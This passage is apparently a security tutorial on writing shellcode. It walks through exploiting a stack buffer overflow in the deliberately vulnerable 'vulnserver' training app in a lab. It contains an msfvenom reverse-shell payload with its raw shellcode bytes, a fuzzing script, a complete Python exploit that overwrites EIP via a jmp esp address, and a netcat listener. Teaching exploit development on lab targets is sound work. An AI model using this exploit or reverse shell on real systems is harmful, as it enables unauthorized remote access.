#### Generating MessageBoxA() Using msfvenom

**msfvenom command for metasploit shellcode generation:**

```
msfvenom -p windows/messagebox TEXT="HELLO WORLD FROM MSFVENOM" TITLE="MESSAGEBOX FROM MSFVENOM" -f c
```

**You will receive the following byte string (or something similar):**

```
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52"
"\x30\x8b\x52\x0c\x8b\x52\x14\x31\xff\x8b\x72\x28\x0f\xb7"
"\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
"\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01"
"\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b"
"\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34"
"\x8b\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
"\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01"
"\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
"\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58"
"\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\xe8\x0b\x00\x00"
"\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x68\x4c"
"\x77\x26\x07\xff\xd5\x6a\x00\xe8\x19\x00\x00\x00\x4d\x45"
"\x53\x53\x41\x47\x45\x42\x4f\x58\x20\x46\x52\x4f\x4d\x20"
"\x4d\x53\x46\x56\x45\x4e\x4f\x4d\x00\xe8\x1a\x00\x00\x00"
"\x48\x45\x4c\x4c\x4f\x20\x57\x4f\x52\x4c\x44\x20\x46\x52"
"\x4f\x4d\x20\x4d\x53\x46\x56\x45\x4e\x4f\x4d\x00\x6a\x00"
"\x68\x45\x83\x56\x07\xff\xd5\x6a\x00\x68\xf0\xb5\xa2\x56"
"\xff\xd5";
```

**If desired, place into the `shellcode` buffer within the "loader", loader.c, and recompile via:**

```
i686-w64-mingw32-gcc-15.1.0.exe -m32 loader.c -o loader.exe
```

## Common Pitfalls and Other "Gotchas"

Like anything else, there is always going to be some obstacle and issues that we run along the way that we should be mindful of when developing shellcode and exploiting vulnerabilities.

### Compatibility Issues (x86/x64)

<figure><img src="../../.gitbook/assets/1_WrMcHYzzzG_nLGMKPHhBUQ (1).png" alt="" width="375"><figcaption></figcaption></figure>

If you have an x86 target, you need to use x86 shellcode.

If you have an x64 target, you need to use x64 shellcode.

Ultimately, your shellcode/payload MUST match your target process/environment's architecture.

Why?

This is because Assembly language features a variety of syntaxes that align with the specified CPU architecture that it is operating on.

* Access to different registers due to a difference in calling convention between the two architectures
  * `stdcall` (x86)
  * `fastcall` (x64)
  * Different data sizes, leading to stack and other misalignment issues = corrupted or truncated shellcode :(

### Null Bytes (`\x00`) & Bad Characters

<figure><img src="../../.gitbook/assets/image (248).png" alt="" width="375"><figcaption></figcaption></figure>

Null bytes, also known as a null-terminator in C-environments will naturally get translated as such and will be marked as the end of the string. Thus, ultimately truncating your shellcode.

Bad characters will lead to a disruption in your shellcode similar to how null bytes do. This is for a multitude of reasons and it is important to verify your bad characters within your environment as it will lead to a misinterpretation of your shellcode depending on your target program/environment.

* Corruption of shellcode
* Filtering
* Encoding issues
* Interpreted by parsing or control characters (e.g. `/n`, `/r`, etc.)

### No-Operation (no-op — NOP) Sleds

> :thinking: "Think of it like a 'landing pad' for your CPU!"

<figure><img src="../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">**What is a No-Op?**</mark>

It is an instruction that does _**Nothing**_, it simply moves on to the next instruction.&#x20;

* Stack multiple NOPs together, and you have what is known as a "NOP Sled"

<mark style="color:yellow;">**Why do we like NOP Sleds?**</mark>

**Increased Exploit Reliability**

Particularly in buffer overflows, it's difficult to guage where we will land in memory after our shellcode detonates.

<mark style="color:yellow;">**Creates a safe "landing zone" for our shellcode**</mark>

During exploitation, it is critical to overwrite the return address and instruction pointer to land on the first byte of the shellcode.

If we fail to do so, our shellcode will be trunacted; leading to misinterpreation/corruption of it.

* "Pads" memory
* "Absorbs" imprecision

<mark style="color:yellow;">**Bonus Information**</mark>

Sometimes (not always), there are size constraints within our environment, leading to restricted or insufficient space to execute our shellcode to ensure proper contiguous memory reguions and ultimately NOP Sleds can aid in fixing alignment.

NOP Sleds ultimately allow us to indirectly increase the size (in bytes) of our payloads naturally without impacting the shellcode's logic.

<figure><img src="../../.gitbook/assets/image (249).png" alt="" width="439"><figcaption></figcaption></figure>

## Taking it to the Next Level (two-in-one) Real-World Application: Exploiting a Buffer Overflow Vulnerability in a Vulnerable Server Application Using our Newly Developed Shellcode

Now, for the moment we've all been waiting for.

<mark style="color:red;">**Let's apply what we learned, taking our shellcode we developed and knowledge we gained and utilize our shellcode for malicious purposes and exploit a vulnerable server application and gain access to the machine hosting the application.**</mark>

{% hint style="info" %}
_**I call this a "two-in-one" because I'm going to be showcasing the development of a reverse shell in Assembly in which we can convert to a byte string and deploy it for use in a Python exploit that will be ingested via the server since it is a chat application, and can leverage a buffer overflow, allowing for execution of our shellcode once the return address and EIP is overwritten.**_
{% endhint %}

### Context

**For this demonstration, we are going to be going through a few key pieces and methodologies that cover the following areas:**

* Vulnerability Research (Vulnerability Discovery)
* Reverse Engineering (Understanding the application and exploiting the identified vulnerability)
* Exploit Development&#x20;

#### Our Target: "Vulnserver"

Check out the vulnserver repo [here](https://github.com/stephenbradshaw/vulnserver).

In most situations, our target will be proprietary and closed-sourced. Meaning, we will be unable to view the source code. However, the developer was nice enough to be able to supply us with their source code for their wonderful server application.&#x20;

Thankfully, this means that we will only have to perform static-analysis on the source code rather than having to rely on reverse engineering the decompiled pseudocode that comes from Ghidra, Binary Ninja, or IDA.&#x20;

* _<mark style="color:red;">**In other words, the work has already been done for us, we just need to read the code and see how we can exploit the vulnerability**</mark>_

### Topology

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

**There will be two machines in this exploit environment:**

**The&#x20;**_<mark style="color:red;">**attacker**</mark>_ :imp:**, acting as a "Client". Featuring a Kali machine.**

**The other, a&#x20;**_<mark style="color:green;">**server**</mark>_ :relaxed:**, will be a Windows host, hosting the vulnerable server application.**

### Methodology

Below illustrates the exact methodology we will be covering in order to successfully exploit this vulnerability using our shellcode that we've developed throughout this writeup.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Showcasing our Methodology Illustration</p></figcaption></figure>

### Step One: Vulnerability Discovery :eyes::telescope:

Utilizing the GitHub repo, we can analyze the source code.&#x20;

Check it out [here](https://github.com/stephenbradshaw/vulnserver/blob/master/vulnserver.c).

#### Identifying a Buffer Overflow Vulnerability

```c
void Function3(char *Input) {       // Takes char input via argument
	char Buffer2S[2000];	    // Stores input in a 2000-byte buffer
	strcpy(Buffer2S, Input);    // strcpy() our input in Buffer2S, with a max size of 2000-bytes
}				    // This is a vulnerable strcpy() as there is no bounds check
```

Since there is a lack of a bounds-check within the `strcpy()` implementation, this means that we can supply the server application an input larger than expected and it will be ingested by the application; allowing us to write past the bounds of the 2000-byte buffer.

{% hint style="info" %}
:bomb: _<mark style="color:red;">**Supply an input larger than 2000-bytes, and we will "overflow" the buffer, leading to a buffer overflow vulnerability.**</mark>_
{% endhint %}

#### <mark style="color:yellow;">"Playing around with the application"</mark>

Here is your safe place to mess around with the application to see how you can exploit this vulnerability.&#x20;

Feel free to take the time and space needed to find other ways to exploit the target, but here, I encourage you to spend time understanding how the application works.

{% hint style="info" %}
:bulb:This aids in exploit development as you will begin to develop an intuitive understanding of how the application is meant to work in addition to how it shouldn't work. Ultimately in an effort that will lead to vulnerabilities.
{% endhint %}

#### Running the Vulnerable Server Application

After cloning the repo, we can immediately run the `vulnserver.exe` binary to kick off the binary on our network:

```
.\vulnserver.exe
```

<figure><img src="../../.gitbook/assets/image (251).png" alt=""><figcaption><p>Showcasing <code>vulnserver.exe</code> running on our Windows server</p></figcaption></figure>

#### Interacting With the Vulnerable Server Application

On our Kali machine, we can interact with `vulnserver` using `netcat` (`nc`):

```
nc 192.168.56.133 9999
```

<figure><img src="../../.gitbook/assets/image (252).png" alt=""><figcaption><p>Connecting to <code>vulnserver</code></p></figcaption></figure>

We can type `HELP` for a list of options and commands that we can issue against the server.

<figure><img src="../../.gitbook/assets/image (253).png" alt=""><figcaption><p>Listing options/commands via <code>HELP</code> command</p></figcaption></figure>

Interesting `TRUN` looks very familiar to the source code that we reviewed earlier.

Be sure to search for `Function3` and `TRUN` in the source code using `CTRL + F`.

**Let's go back to our source code to find ties to `TRUN` with the buffer overflow we saw earlier:**

**`vulnserver.c:204`:**

```c
// Line 204 in vulnserver.c
else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
				char *TrunBuf = malloc(3000);
				memset(TrunBuf, 0, 3000);
				for (i = 5; i < RecvBufLen; i++) {
					if ((char)RecvBuf[i] == '.') {
						strncpy(TrunBuf, RecvBuf, 3000);				
						Function3(TrunBuf);
						break;
					}
```

Awesome, we see that `Function3()` (the implementation has the buffer overflow vulnerability). `TrunBuf` is holding our `TRUN` input.&#x20;

_<mark style="color:yellow;">**However, we see that there is a line featuring an**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`if`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**condition that showcases that it will ONLY call**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`Function3()`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**if there is a "**</mark><mark style="color:yellow;">**`.`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**" character immediately after the**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`TRUN`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**command followed by our input.**</mark>_

So, by using the `TRUN` command, we can weaponize this logic to leverage the buffer overflow found within `Function3()`. All we need to do is test this logic and see if we can write past the buffer (more than 2000-bytes) and we should get a crash. If that is the case, we can begin crafting our exploit.

#### Testing our Theory

_<mark style="color:yellow;">With the server running, let's use our</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`TRUN`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">command with a</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`.`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">+ our</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`input`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">to see if we can access/reach the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`if`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">condition that will allow us to jump to</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`Function3()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">as showcased above.</mark>_

**Let's generate a bunch of random A's using Python3:**

<pre><code>python3 -c "print ('A' * 2001)"

<strong># output: 
</strong><strong>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</strong></code></pre>

This will give us our strategic 2001 A's that we need (one more byte larger than the buffer can handle).

I tested with 2000 A's, the buffer was sufficiently large enough to handle the maximum size allocated.

{% hint style="info" %}
Upon using the `TRUN` command, we can use the `.` character + `input` and issue a crash on the suffer due to a buffer overflow vulnerability, currently leading to a denial of service vulnerability (still no code execution quite yet, but we did confirm that our input is now attacker controlled).
{% endhint %}

<figure><img src="../../.gitbook/assets/image (254).png" alt=""><figcaption><p>Screenshot showcasing the <code>TRUN</code> command + <code>.</code> + our <code>input</code> that leads to an application crash (DoS)</p></figcaption></figure>

This immediately terminated the `netcat` session.

**As we can see, checking back on the server, this indeed led to a crash:**

<figure><img src="../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

With our theory confirmed, we can now jump straight into fuzzing and exploit development.

### Step Two: Fuzzing & Exploit Development :gear::writing\_hand:

Now that we understand the vulnerability at hand, we can now begin to "fuzz" the target application in an attempt to see if we can implement attacker-controlled data and begin to measure how much we will need to write past the buffer to control the return address and EIP.

#### Fuzzing

Fuzzing is an automated software testing method that injects numerous invalid, malformed, or unexpected inputs into a system to reveal software vulnerabilities. It will then return those results as well as the error, outcome, and the input that caused the crash or other unwanted/undesired outcome.

We can use Python (`python2`) in order to craft our fuzzing harness.

{% hint style="info" %}
At this point, since we understand the vulnerability, this isn't really necessary, but thought the additional application would make this writeup even more badass, so enjoy seeing some Python automation to find the crash.
{% endhint %}

**`trunFuzz.py`:**

```python
#!/usr/bin/python
import socket
server = '192.168.56.133' # Place the IP of your target Windows client here
sport = 9999

length = int(raw_input('Length of attack: '))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack length ", length, ' to TRUN .'
attack = 'A' * length
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
```

This Python script asks for user-input that will append `TRUN` + `.` + our `input` and send it to the server, forcing a jump to the `Function3()` function, withholding the buffer overflow vulnerability.

**Let's see it in action:**

<figure><img src="../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

Awesome, this led to another crash.

#### But Wait, There's More...

Just because we're crashing doesn't mean that we're overwriting `EIP`.

Let's use a debugger to dive deeper.&#x20;

Here, I'm utilizing `x86dbg`, since `vulnserver.exe` is an x86 executable.

Sending an input of 2001 A's gives us the following outcome.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Showcasing our malicious <code>TRUN</code> + <code>.</code> +<code>input</code> in memory with still no overwritten <code>EIP</code></p></figcaption></figure>

Above, `EIP` is likely pointing at `Function3()` in memory due to our input.

Restarting the process in x86dbg, let's run it once more using a different strategy to overwrite `EIP`.

Let's run it once more with more A's in our `input`. Next, I will be sending 3000-bytes of `A`'s to see if we can overwrite `EAX` and `EIP` using our fuzzing script.

```
python2 vs-fuzz.py
Length of attack: 3000
Welcome to Vulnerable Server! Enter HELP for help.

Sending attack length  3000  to TRUN .
```

#### Showcasing attacker-controlled input and successfully overwriting `EIP`:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Showcasing control of <code>EIP</code> register</p></figcaption></figure>

#### Locating Useful Assembly Code in `x32dbg`

1. Next, in `x32dbg`, right-click in the CPU view, select "Search For" --> "All Modules" --> "Command".
2. In the Search Command pop-up, search for "jmp esp" (without quotes).

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Showcasing <code>jmp esp</code> — useful Assembly code for our exploit</p></figcaption></figure>

Locate the first instruction that appears, it is an instruction found within `essfunc.dll` -- highlight over the address to showcase that it is indeed from the loaded/imported module, `essfunc.dll` that comes shipped with vulnserver.

We can now use that jump address and convert it into a little-endian byte-string for use in our exploit.

`0x625011AF`\
`\xAF\x11\x50\x62`

#### You're Probably Thinking... ASLR... Right?

<mark style="color:yellow;">**THIS IS IMPORTANT, READ!**</mark>

You'd be right, ASLR is ENABLED on my machine. However, how can we hardcode this address in our exploit code and why does it not change upon each execution of `vulnserver.exe`?&#x20;

This is because `essfunc.dll`, was compiled without ASLR support. As such, this DLL is incompatable with system-wide ASLR. Meaning, it will have the same addresses upon each execution cycle.

_<mark style="color:yellow;">**Let's craft our exploit now.**</mark>_

#### Developing our `TRUN` Function Buffer Overflow Exploit

Generating Shellcode via `msfvenom` (for brevity of this writeup, I'm generating shellcode via `msfvenom`, but feel more than free to craft your own reverse shell or obtain one externally, or just follow along):

```
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP_HERE> LPORT=1337 -a x86 --platform windows -f c -b "\x00" 

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xbe\x90\x11\x71\xa9\xda\xd1\xd9\x74\x24\xf4\x5d\x29\xc9"
"\xb1\x52\x31\x75\x12\x03\x75\x12\x83\x55\x15\x93\x5c\xa9"
"\xfe\xd1\x9f\x51\xff\xb5\x16\xb4\xce\xf5\x4d\xbd\x61\xc6"
"\x06\x93\x8d\xad\x4b\x07\x05\xc3\x43\x28\xae\x6e\xb2\x07"
"\x2f\xc2\x86\x06\xb3\x19\xdb\xe8\x8a\xd1\x2e\xe9\xcb\x0c"
"\xc2\xbb\x84\x5b\x71\x2b\xa0\x16\x4a\xc0\xfa\xb7\xca\x35"
"\x4a\xb9\xfb\xe8\xc0\xe0\xdb\x0b\x04\x99\x55\x13\x49\xa4"
"\x2c\xa8\xb9\x52\xaf\x78\xf0\x9b\x1c\x45\x3c\x6e\x5c\x82"
"\xfb\x91\x2b\xfa\xff\x2c\x2c\x39\x7d\xeb\xb9\xd9\x25\x78"
"\x19\x05\xd7\xad\xfc\xce\xdb\x1a\x8a\x88\xff\x9d\x5f\xa3"
"\x04\x15\x5e\x63\x8d\x6d\x45\xa7\xd5\x36\xe4\xfe\xb3\x99"
"\x19\xe0\x1b\x45\xbc\x6b\xb1\x92\xcd\x36\xde\x57\xfc\xc8"
"\x1e\xf0\x77\xbb\x2c\x5f\x2c\x53\x1d\x28\xea\xa4\x62\x03"
"\x4a\x3a\x9d\xac\xab\x13\x5a\xf8\xfb\x0b\x4b\x81\x97\xcb"
"\x74\x54\x37\x9b\xda\x07\xf8\x4b\x9b\xf7\x90\x81\x14\x27"
"\x80\xaa\xfe\x40\x2b\x51\x69\xaf\x04\x61\xea\x47\x57\x91"
"\xe9\xae\xde\x77\x9b\xc0\xb6\x20\x34\x78\x93\xba\xa5\x85"
"\x09\xc7\xe6\x0e\xbe\x38\xa8\xe6\xcb\x2a\x5d\x07\x86\x10"
"\xc8\x18\x3c\x3c\x96\x8b\xdb\xbc\xd1\xb7\x73\xeb\xb6\x06"
"\x8a\x79\x2b\x30\x24\x9f\xb6\xa4\x0f\x1b\x6d\x15\x91\xa2"
"\xe0\x21\xb5\xb4\x3c\xa9\xf1\xe0\x90\xfc\xaf\x5e\x57\x57"
"\x1e\x08\x01\x04\xc8\xdc\xd4\x66\xcb\x9a\xd8\xa2\xbd\x42"
"\x68\x1b\xf8\x7d\x45\xcb\x0c\x06\xbb\x6b\xf2\xdd\x7f\x9b"
"\xb9\x7f\x29\x34\x64\xea\x6b\x59\x97\xc1\xa8\x64\x14\xe3"
"\x50\x93\x04\x86\x55\xdf\x82\x7b\x24\x70\x67\x7b\x9b\x71"
"\xa2";
```

Now time for our exploit, we can leverage the same fuzzing logic as uses the same logic to send our `input` but we just have to append our `EIP` address using our newly found useful Assembly code (`jmp esp`) address.

**`exploit.py`:**

```python
#!/usr/bin/python
import socket
server = 'TARGET_SERVER_IP_HERE'
sport = 9999

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
exploit = (
"\xbe\x90\x11\x71\xa9\xda\xd1\xd9\x74\x24\xf4\x5d\x29\xc9"
"\xb1\x52\x31\x75\x12\x03\x75\x12\x83\x55\x15\x93\x5c\xa9"
"\xfe\xd1\x9f\x51\xff\xb5\x16\xb4\xce\xf5\x4d\xbd\x61\xc6"
"\x06\x93\x8d\xad\x4b\x07\x05\xc3\x43\x28\xae\x6e\xb2\x07"
"\x2f\xc2\x86\x06\xb3\x19\xdb\xe8\x8a\xd1\x2e\xe9\xcb\x0c"
"\xc2\xbb\x84\x5b\x71\x2b\xa0\x16\x4a\xc0\xfa\xb7\xca\x35"
"\x4a\xb9\xfb\xe8\xc0\xe0\xdb\x0b\x04\x99\x55\x13\x49\xa4"
"\x2c\xa8\xb9\x52\xaf\x78\xf0\x9b\x1c\x45\x3c\x6e\x5c\x82"
"\xfb\x91\x2b\xfa\xff\x2c\x2c\x39\x7d\xeb\xb9\xd9\x25\x78"
"\x19\x05\xd7\xad\xfc\xce\xdb\x1a\x8a\x88\xff\x9d\x5f\xa3"
"\x04\x15\x5e\x63\x8d\x6d\x45\xa7\xd5\x36\xe4\xfe\xb3\x99"
"\x19\xe0\x1b\x45\xbc\x6b\xb1\x92\xcd\x36\xde\x57\xfc\xc8"
"\x1e\xf0\x77\xbb\x2c\x5f\x2c\x53\x1d\x28\xea\xa4\x62\x03"
"\x4a\x3a\x9d\xac\xab\x13\x5a\xf8\xfb\x0b\x4b\x81\x97\xcb"
"\x74\x54\x37\x9b\xda\x07\xf8\x4b\x9b\xf7\x90\x81\x14\x27"
"\x80\xaa\xfe\x40\x2b\x51\x69\xaf\x04\x61\xea\x47\x57\x91"
"\xe9\xae\xde\x77\x9b\xc0\xb6\x20\x34\x78\x93\xba\xa5\x85"
"\x09\xc7\xe6\x0e\xbe\x38\xa8\xe6\xcb\x2a\x5d\x07\x86\x10"
"\xc8\x18\x3c\x3c\x96\x8b\xdb\xbc\xd1\xb7\x73\xeb\xb6\x06"
"\x8a\x79\x2b\x30\x24\x9f\xb6\xa4\x0f\x1b\x6d\x15\x91\xa2"
"\xe0\x21\xb5\xb4\x3c\xa9\xf1\xe0\x90\xfc\xaf\x5e\x57\x57"
"\x1e\x08\x01\x04\xc8\xdc\xd4\x66\xcb\x9a\xd8\xa2\xbd\x42"
"\x68\x1b\xf8\x7d\x45\xcb\x0c\x06\xbb\x6b\xf2\xdd\x7f\x9b"
"\xb9\x7f\x29\x34\x64\xea\x6b\x59\x97\xc1\xa8\x64\x14\xe3"
"\x50\x93\x04\x86\x55\xdf\x82\x7b\x24\x70\x67\x7b\x9b\x71"
"\xa2"
)
padding = 'F' * (3000 - 2006 - 4 - 16 - len(exploit))
attack = prefix + eip + nopsled + exploit + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
```

### Step Three: Exploit Time!

Now that we crafted our exploit, let's exploit this buffer overflow!

#### Setup a Netcat Listener

```
nc -lnvp 1337
```

#### Run Exploit (`exploit.py`)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Enjoy your shell!

## Conclusion

Thank you so much for reading through this if you've made it this far, you're a trooper for sure.&#x20;

This was quite the adventure for me and so much fun. I hope you learned as much as I did in this!

More to come! :handshake:
